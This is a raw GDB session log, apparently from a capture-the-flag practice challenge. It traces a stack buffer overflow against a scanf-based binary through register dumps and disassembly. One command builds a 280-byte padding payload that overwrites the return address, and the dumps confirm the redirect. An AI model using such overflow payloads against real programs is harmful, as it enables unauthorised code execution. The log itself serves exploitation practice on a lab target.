0x3defd9f2fd0:	0x4141414141414141	0x4141414141414141
0x3defd9f2fe0:	0x4141414141414141	0x4141414141414141
0x3defd9f2ff0:	0x4141414141414141	0x4141414141414141
0x3defd9f3000:	0x4141414141414141	0x4141414141414141
gdb$ 
0x3defd9f3010:	0x4141414141414141	0x4141414141414141
0x3defd9f3020:	0x4141414141414141	0x4141414141414141
0x3defd9f3030:	0x4141414141414141	0x4141414141414141
0x3defd9f3040:	0x4141414141414141	0x4141414141414141
0x3defd9f3050:	0x4141414141414141	0x4141414141414141
0x3defd9f3060:	0x4141414141414141	0x4141414141414141
0x3defd9f3070:	0x4141414141414141	0x0000011b41414141
0x3defd9f3080:	0x4141414141414141	0x00000335004006cd
0x3defd9f3090:	0x000003defd9f3168	0x000003defd9f3168
0x3defd9f30a0:	0x0000000100000001	0x00000000004006fc
0x3defd9f30b0:	0x0000000000000000	0x1ecb5458d7ce5d47
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x4141414141414141  RSP: 0x000003DEFD9F3088  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x00000335440979E0  RCX: 0x0000000000000114  RIP: 0x000000000040075E
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x00000335440946A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x000003DEFD9F3160  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
   0x40076c <__libc_csu_init+12>:	mov    r13,rdx
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075e in main ()
gdb$ i r
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x114	0x114
rdx            0x335440979e0	0x335440979e0
rsi            0x7ffffeeb	0x7ffffeeb
rdi            0x1	0x1
rbp            0x4141414141414141	0x4141414141414141
rsp            0x3defd9f3088	0x3defd9f3088
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x335440946a0	0x335440946a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x3defd9f3160	0x3defd9f3160
r14            0x0	0x0
r15            0x0	0x0
rip            0x40075e	0x40075e <main+98>
eflags         0x202	[ IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22xg $rsp
0x3defd9f3088:	0x00000335004006cd	0x000003defd9f3168
0x3defd9f3098:	0x000003defd9f3168	0x0000000100000001
0x3defd9f30a8:	0x00000000004006fc	0x0000000000000000
0x3defd9f30b8:	0x1ecb5458d7ce5d47	0x00000000004005e0
0x3defd9f30c8:	0x000003defd9f3160	0x0000000000000000
0x3defd9f30d8:	0x0000000000000000	0x1976af66b6ee5d47
0x3defd9f30e8:	0x18a1d3c7ca345d47	0x0000000000000000
0x3defd9f30f8:	0x0000000000000000	0x0000000000000000
0x3defd9f3108:	0x000003defd9f3178	0x00000335442c01c8
0x3defd9f3118:	0x00000335440ac1f3	0x0000000000000000
0x3defd9f3128:	0x0000000000000000	0x00000000004005e0
gdb$ 
0x3defd9f3138:	0x000003defd9f3160	0x0000000000000000
0x3defd9f3148:	0x0000000000400609	0x000003defd9f3158
0x3defd9f3158:	0x000000000000001c	0x0000000000000001
0x3defd9f3168:	0x000003defd9f33bd	0x0000000000000000
0x3defd9f3178:	0x000003defd9f33de	0x000003defd9f33ed
0x3defd9f3188:	0x000003defd9f33fe	0x000003defd9f3410
0x3defd9f3198:	0x000003defd9f3422	0x000003defd9f3432
0x3defd9f31a8:	0x000003defd9f3446	0x000003defd9f3468
0x3defd9f31b8:	0x000003defd9f3479	0x000003defd9f348c
0x3defd9f31c8:	0x000003defd9f34a2	0x000003defd9f34b5
0x3defd9f31d8:	0x000003defd9f34c0	0x000003defd9f34cc
gdb$ shell python -c 'print "A"*(256+24) + "\xcd\x06\x40\x00\x00\x00"' > /tmp/py
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86617F0  o d I t s Z a P c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86618D8  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x0000000000400700
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400700 <main+4>:	sub    rsp,0x120
   0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
-----------------------------------------------------------------------------------------------------------------------------

Breakpoint 1, 0x0000000000400700 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86618D8  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x0000000000400707
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400707 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86618D8  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x000000000040070D
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040070d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86618D8  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x0000000000400714
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400714 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86618D8  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x000000000040071B
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071b in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x00000383E86616E0  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x000000000040071E
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x00000383E86616E0  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x0000000000400723
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400723 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x00000383E86616E0  RDX: 0x00000383E86618E8  RCX: 0x0000000000000000  RIP: 0x0000000000400728
  R8 : 0x000002ED77C11E80  R9 : 0x000002ED77C27530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400728 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x000002ED77C11640  RSI: 0x000002ED77C129F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x000000000040072D
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040072d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x000002ED77C11640  RSI: 0x000002ED77C129F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400734
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400734 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000383E86616E0  RSI: 0x000002ED77C129F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400737
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400737 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000011B  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000383E86616E0  RSI: 0x0000000000000000  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x000000000040073C
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073c in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000011B  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000383E86616E0  RSI: 0x0000000000000000  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x000000000040073F
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073f in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000383E86616E0  RSI: 0x0000000000000000  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x0000000000400746
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400746 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000383E86616E0  RSI: 0x00000383E86616E0  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x0000000000400749
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400749 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000383E86616E0  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x00000383E86616E0  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x000000000040074E
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040074e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a P c 
  RDI: 0x00000000004007F1  RSI: 0x00000383E86616E0  RDX: 0x000000000000003B  RCX: 0xF800000000000000  RIP: 0x0000000000400753
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x00000383E86617FE  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400753 in main ()
gdb$ 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000115  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x000002ED77C129E0  RCX: 0x0000000000000114  RIP: 0x0000000000400758
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002ED77C0F6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400758 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x00000383E86617F0  RSP: 0x00000383E86616D0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x000002ED77C129E0  RCX: 0x0000000000000114  RIP: 0x000000000040075D
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002ED77C0F6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x4141414141414141  RSP: 0x00000383E86617F8  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x000002ED77C129E0  RCX: 0x0000000000000114  RIP: 0x000000000040075E
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002ED77C0F6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
   0x40076c <__libc_csu_init+12>:	mov    r13,rdx
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075e in main ()
gdb$ x/22xg $rsp
0x383e86617f8:	0x00000000004006cd	0x00000383e86618d8
0x383e8661808:	0x00000383e86618d8	0x0000000100000001
0x383e8661818:	0x00000000004006fc	0x0000000000000000
0x383e8661828:	0x25437a142b17398c	0x00000000004005e0
0x383e8661838:	0x00000383e86618d0	0x0000000000000000
0x383e8661848:	0x0000000000000000	0x2244aad81b17398c
0x383e8661858:	0x2099951a56ed398c	0x0000000000000000
0x383e8661868:	0x0000000000000000	0x0000000000000000
